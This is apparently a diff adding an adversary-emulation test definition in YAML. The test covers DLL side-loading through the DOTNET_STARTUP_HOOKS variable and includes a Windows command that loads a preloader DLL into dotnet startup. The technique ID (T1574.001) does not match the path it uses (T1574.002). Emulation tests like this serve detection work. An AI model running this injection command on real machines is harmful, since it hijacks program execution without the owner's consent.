@@ -1,0 +1,21 @@
+---
+- id: 1812bdf9f98f8402ee87a7ac3135ec4b
+  name: DLL Side-Loading using the dotnet startup hook environment variable
+  description: 'Utilizing the dotnet_startup_hooks environment variable, this method
+    allows for registering a global method in an assembly that will be executed whenever
+    a .net core application is started. This unlocks a whole range of scenarios, from
+    injecting a profiler to tweaking a static context in a given environment. [blog
+    post](https://medium.com/criteo-engineering/c-have-some-fun-with-net-core-startup-hooks-498b9ad001e1)
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1574.001
+    name: 'Hijack Execution Flow: DLL'
+  platforms:
+    windows:
+      cmd:
+        command: set DOTNET_STARTUP_HOOKS="PathToAtomicsFolder\T1574.002\bin\preloader.dll"
+          && dotnet -h > nul && echo.
+        payloads: []
+        cleanup: taskkill /F /IM calculator.exe >nul 2>&1
